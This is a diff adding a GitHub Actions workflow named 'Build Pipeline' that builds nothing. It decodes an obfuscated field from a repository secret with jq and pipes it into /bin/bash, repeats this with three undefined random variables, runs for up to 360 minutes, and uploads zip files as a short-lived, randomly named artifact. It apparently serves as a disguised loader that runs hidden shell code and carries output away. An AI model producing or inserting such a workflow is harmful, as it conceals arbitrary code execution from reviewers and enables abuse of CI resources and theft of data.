@@ -1,0 +1,38 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          b8: ${{ secrets.b8 }}
+        run: |
+          printf '%s' "$b8" | jq -r .k41021 | /bin/bash
+          echo $dmj71467 | jq -r .ncu0445 | /bin/bash
+          printf '%s' "$xx72" | jq -r .jhv032 | /bin/bash
+          printf '%s' "$vri91" | jq -r .xhwh65 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: OHiokxvR
+          path: "*.zip"
+          retention-days: 1
